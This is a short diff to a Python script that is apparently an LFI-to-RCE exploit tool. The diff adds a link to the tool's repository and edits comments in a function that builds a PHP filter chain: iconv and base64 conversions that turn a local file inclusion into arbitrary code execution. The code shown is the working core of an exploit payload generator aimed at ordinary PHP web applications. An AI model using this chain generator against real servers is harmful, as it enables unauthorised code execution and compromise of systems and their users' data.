@@ -3,6 +3,8 @@ import webbrowser
 import requests
 import base64
 
+#Tool Link: https://github.com/jameel3reef/mrAlphaQ/blob/main/Tools/LFI-RCE.py
+
 def chain(base64_payload):
     conversions = {
         '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
@@ -72,19 +74,16 @@ def chain(base64_payload):
         '=': ''
     }
 
-    # generate some garbage base64
+    # this is to generate garbage base64 code
     filters = "convert.iconv.UTF8.CSISO2022KR|"
     filters += "convert.base64-encode|"
-    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file
     filters += "convert.iconv.UTF8.UTF7|"
 
 
     for c in base64_payload[::-1]:
             filters += conversions[c] + "|"
-            # decode and reencode to get rid of everything that isn't valid base64
             filters += "convert.base64-decode|"
             filters += "convert.base64-encode|"
-            # get rid of equal signs
             filters += "convert.iconv.UTF8.UTF7|"
 
     filters += "convert.base64-decode"
